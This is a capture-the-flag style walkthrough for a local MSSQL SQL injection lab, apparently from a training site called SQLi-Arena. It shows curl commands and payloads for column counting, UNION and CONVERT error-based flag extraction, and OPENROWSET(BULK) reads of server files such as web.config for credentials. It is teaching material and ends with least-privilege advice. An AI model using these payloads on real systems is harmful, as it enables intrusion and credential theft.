<h4>Step 1: Test Normal File Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=report"<br><br>
        <span class="prompt">Input: </span>report<br>
        <span class="prompt">SQL: </span>SELECT filename, filesize, uploaded_by FROM files WHERE filename LIKE '%report%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>report_q3_2026.pdf</strong> &bull; 2458000 bytes &bull; Uploaded by: admin
    </div>
</div>

<h4>Step 2: Confirm Injection and Column Count</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error + Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "...?search=%27" <em># single quote</em><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string ''.</strong><br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "search=' ORDER BY 3 -- -"<br>
        <span class="prompt">Input: </span>' ORDER BY 3 -- -<br>
        <span class="prompt">Result: </span>All 6 files displayed (3 columns confirmed)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "search=' ORDER BY 4 -- -"<br>
        <span class="prompt">Input: </span>' ORDER BY 4 -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The ORDER BY position number 4 is out of range of the number of items in the select list.</strong>
    </div>
</div>

<h4>Step 3: Extract Flag via UNION</h4>
<p>3 columns: filename (varchar), filesize (int), uploaded_by (varchar).</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. UNION Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
        <span class="prompt">Input: </span>' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -<br><br>
        <span class="prompt">Output (injected row):</span><br>
        <strong>FLAG{ms_0p3nr0ws3t_r34d}</strong> &bull; 0 bytes &bull; Uploaded by: LEAKED
    </div>
</div>

<h4>Step 4: Alternative. CONVERT Error-Based</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. CONVERT Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_0p3nr0ws3t_r34d}' to data type int.</strong>
    </div>
</div>

<h4>Step 5: OPENROWSET(BULK) File Read (Conceptual)</h4>
<p>
    <code>OPENROWSET(BULK ...)</code> reads server-side files into query results.
    Requires <code>ADMINISTER BULK OPERATIONS</code> privilege or sysadmin role.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. OPENROWSET Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT data, NULL, NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS f(data) -- -<br>
        <span class="prompt">Error: </span><strong>You do not have permission to use the bulk load statement.</strong><br><br>
        <span class="prompt">// The sqli_arena user lacks BULK permissions in this lab setup.</span><br>
        <span class="prompt">// With sysadmin or ADMINISTER BULK OPERATIONS, this would read any file.</span>
    </div>
</div>

<h4>Step 6: OPENROWSET Attack Chain (With Permissions)</h4>
<p>When the database user has bulk permissions, the following reads work:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. OPENROWSET File Reads</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Read text file as single string (SINGLE_CLOB):</span><br>
        <span class="prompt">Input: </span>' UNION SELECT data, NULL, NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS f(data) -- -<br><br>
        <span class="prompt">// Read web.config for credentials:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT data, NULL, NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS f(data) -- -<br><br>
        <span class="prompt">// Error-based file read (when UNION blocked):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT data FROM OPENROWSET(BULK 'C:\flag.txt', SINGLE_CLOB) AS f(data))) -- -<br><br>
        <span class="prompt">// Read modes:</span><br>
        <span class="prompt">SINGLE_CLOB  </span>-- text file as nvarchar(max)<br>
        <span class="prompt">SINGLE_BLOB  </span>-- binary file as varbinary(max)<br>
        <span class="prompt">SINGLE_NCLOB </span>-- Unicode text as nvarchar(max)
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_0p3nr0ws3t_r34d}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
        <span class="prompt">Output: </span><strong>FLAG{ms_0p3nr0ws3t_r34d}</strong> &bull; 0 bytes &bull; Uploaded by: LEAKED
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's <code>OPENROWSET(BULK ...)</code> provides a powerful
    file read primitive when the user has <code>ADMINISTER BULK OPERATIONS</code> or sysadmin.
    <code>SINGLE_CLOB</code> reads text files, <code>SINGLE_BLOB</code> reads binary files.
    Combined with UNION or error-based extraction, this allows reading web.config, credentials,
    source code, and system files. Restrict BULK permissions and use least-privilege accounts.
</div>
